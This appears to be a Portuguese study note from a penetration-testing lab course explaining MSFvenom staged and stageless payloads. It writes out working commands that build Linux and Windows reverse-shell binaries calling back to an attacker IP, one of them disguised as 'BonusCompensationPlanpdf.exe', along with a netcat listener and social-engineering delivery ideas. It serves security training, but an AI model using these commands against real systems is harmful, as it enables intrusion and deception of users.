Haverá situações em que não teremos acesso direto à rede para uma máquina-alvo vulnerável. Nesses casos, precisaremos ser astutos em como a carga útil é entregue e executada no sistema. Uma dessas maneiras pode ser usar `MSFvenom`para criar uma carga útil e enviá-la por mensagem de e-mail ou outros meios de engenharia social para levar o usuário a executar o arquivo.

Além de fornecer uma carga útil com opções de entrega flexíveis, o MSFvenom também nos permite `encrypt`& `encode`cargas úteis para ignorar assinaturas comuns de detecção de antivírus. Vamos praticar um pouco com esses conceitos.

Em qualquer host com MSFvenom instalado, podemos emitir o comando `msfvenom -l payloads`para listar todos os payloads disponíveis.

#### Listar cargas úteis
```bash-session
NycolasRamos@htb[/htb]$ msfvenom -l payloads
```
![[Pasted image 20240830090427.png]]

Primeiro, podemos ver que a convenção de nomenclatura de payload quase sempre começa listando o SO do alvo ( `Linux`, `Windows`, `MacOS`, `mainframe`, etc...). Também podemos ver que alguns payloads são descritos como ( `staged`) ou ( `stageless`). Vamos cobrir a diferença.

## Payloads ``staged`` vs. `stageless`

**Staged payloads** permitem enviar componentes adicionais durante um ataque. Por exemplo, o payload `linux/x86/shell/reverse_tcp` envia um pequeno estágio ao alvo que, ao ser executado, baixa o restante do payload, estabelecendo um shell reverso. Esses estágios ocupam espaço na memória e podem variar conforme o payload. 

**Stageless payloads**, como `linux/zarch/meterpreter_reverse_tcp`, são enviados inteiros sem estágio, o que é vantajoso em ambientes com pouca largura de banda ou alta latência, evitando sessões de shell instáveis. Esses payloads também podem ser mais eficazes para evasão, pois geram menos tráfego na rede.

Aqui está um resumo simples:

No Metasploit, você pode identificar um payload como **staged** ou **stageless** pelo nome. Se o nome do payload tiver várias partes separadas por barras, como `linux/x86/shell/reverse_tcp`, isso indica que é um **staged payload**, com cada parte representando um estágio. Por outro lado, um nome que combina tudo em uma só parte, como `linux/zarch/meterpreter_reverse_tcp`, indica um **stageless payload**, onde o shell e a comunicação de rede estão integrados. Se houver dúvida, a descrição do payload geralmente indicará se ele é staged ou stageless.

## Construindo um payload ``stageless``
Agora vamos construir uma carga útil simples sem estágios com o msfvenom e detalhar o comando.

#### Construa-o
```bash-session
NycolasRamos@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```
<pre style="overflow-x:scroll;">
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
</pre>

#### Chame o MSFvenom
```bash-session
msfvenom
```
Define a ferramenta usada para fazer a carga útil.

#### Criando um payload
```shell-session
-p
```
Essa ``option`` indica que o msfvenom está criando uma carga útil.

#### Escolha da carga útil com base na arquitetura
```shell-session
linux/x64/shell_reverse_tcp
```
Especifica um payload `Linux` `64-bit` sem estágios que iniciará um shell reverso baseado em TCP ( `shell_reverse_tcp`).

#### Endereço para conexão de volta
```shell-session
LHOST=10.10.14.113 LPORT=443 
```
Quando executado, o payload retornará a chamada para o endereço IP especificado ( `10.10.14.113`) na porta especificada ( `443`).

#### Formato para gerar o payload em ...
```shell-session
-f elf
```
O sinalizador `-f` indica o formato em que o binário gerado estará. Neste caso em ``.elf``

#### Saída
```shell-session
> createbackup.elf
```
Cria o binário .elf e nomeia o arquivo createbackup. Podemos nomear esse arquivo como quisermos.

## Executando um payload sem estágios
Neste ponto, temos a carga útil criada em nossa caixa de ataque. Agora, precisaríamos desenvolver uma maneira de colocar essa carga útil no sistema alvo. Existem inúmeras maneiras de fazer isso. Aqui estão apenas algumas das maneiras comuns:

- Mensagem de e-mail com o arquivo anexado.
- Link para download em um site.
- Combinado com um módulo de exploração Metasploit (isso provavelmente exigiria que já estivéssemos na rede interna).
- Via pen drive como parte de um teste de penetração no local.

Quando o arquivo estiver no sistema, ele também precisará ser executado.

#### Payload do Ubuntu
![[Pasted image 20240830092339.png]]
Teríamos um ouvinte pronto para capturar a conexão no lado da caixa de ataque após a execução bem-sucedida.

#### Conexão com o NC
```shell-session
NycolasRamos@htb[/htb]$ sudo nc -lvnp 443
```
Quando o arquivo é executado, vemos que capturamos um shell.

#### Conexão estabelecida
```shell-session
NycolasRamos@htb[/htb]$ sudo nc -lvnp 443
```
![[Pasted image 20240830092430.png]]
Esse mesmo conceito pode ser usado para criar cargas úteis para diversas plataformas, incluindo Windows.

## Construindo um Payload simples sem estágios para um sistema Windows
Também podemos usar o msfvenom para criar um arquivo executável (`.exe`) que pode ser executado em um sistema Windows para fornecer um shell.

#### Payload do Windows
```shell-session
NycolasRamos@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```
A sintaxe do comando pode ser quebrada da mesma forma que fizemos acima. As únicas diferenças, é claro, são o `platform`( `Windows`) e o formato ( `.exe`) do payload.

## Executando um Payload simples sem estágios em um sistema Windows
Esta é outra situação em que precisamos ser criativos para entregar esta carga útil a um sistema alvo. Sem qualquer `encoding`ou `encryption`, a carga útil neste formato quase certamente seria detectada pelo Windows Defender AV.

![[Pasted image 20240830092717.png]]

Se o AV estivesse desabilitado, tudo o que o usuário precisaria fazer seria clicar duas vezes no arquivo para executá-lo e teríamos uma sessão de shell.

```shell-session
NycolasRamos@htb[/htb]$ sudo nc -lvnp 443
```
![[Pasted image 20240830092743.png]]

























































